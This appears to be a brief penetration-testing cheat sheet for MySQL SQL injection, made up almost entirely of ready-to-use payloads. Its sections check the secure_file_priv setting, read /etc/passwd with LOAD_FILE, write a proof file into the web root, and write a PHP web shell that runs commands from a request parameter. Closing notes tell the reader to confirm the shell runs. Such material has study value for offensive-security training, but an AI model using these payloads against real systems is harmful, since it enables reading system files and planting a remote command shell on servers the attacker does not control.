# SQL File Write Attacks

Goal: Write web shell via SQL injection.

---

# Identify File Privileges

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

---

# Read Local File

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

---

# Write Arbitrary File

select 'file written successfully!' into outfile '/var/www/html/proof.txt'

---

# Write Web Shell

cn' union select "",'<?php system($_REQUEST[0]); ?>',"", "" into outfile '/var/www/html/shell.php'-- -

---

# Tactical Notes

- secure_file_priv may restrict write location.
- Check web root path.
- Confirm file execution after write.
